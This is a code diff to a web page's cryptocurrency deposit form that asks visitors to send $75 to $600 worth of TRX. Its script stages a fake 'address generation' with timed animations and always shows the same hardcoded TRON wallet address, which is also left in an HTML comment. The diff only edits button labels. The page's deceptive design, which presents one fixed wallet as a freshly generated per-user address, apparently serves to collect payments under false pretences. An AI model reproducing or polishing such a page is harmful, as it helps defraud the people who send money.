@@ -25,7 +25,7 @@
     <div class="deposit">
         <label for="sdf">please send only trx (min - 75$ worth TRX) (max - 600$ worth TRX)</label>
         <input id="sdf" type="text" placeholder="no address generated" readonly class="adrf">
-        <button class="gen">Click to generate deposit address</button>
+        <button class="gen">Copy</button>
     </div>
     <!-- TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP -->
 
@@ -62,13 +62,13 @@
         /*document.querySelector(".adrf").value = localStorage.getItem("blc");*/
         gen.addEventListener("click", () => {
     
-                gen.innerHTML = "Generating..";
+                
                 setTimeout(() => {
                     gen.classList.add("half");
                 }, 1000);
                 setTimeout(() => {
                     gen.classList.add("full");
-                    gen.innerHTML = "Generated!";
+                    gen.innerHTML = "Success!";
                     document.querySelector(".adrf").value = "TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP";
                     /*localStorage.setItem("blc", "TQwUCmVJHQqWSZsJ7PFUVgA7kbNJATKFiP");*/
                 }, 2000);
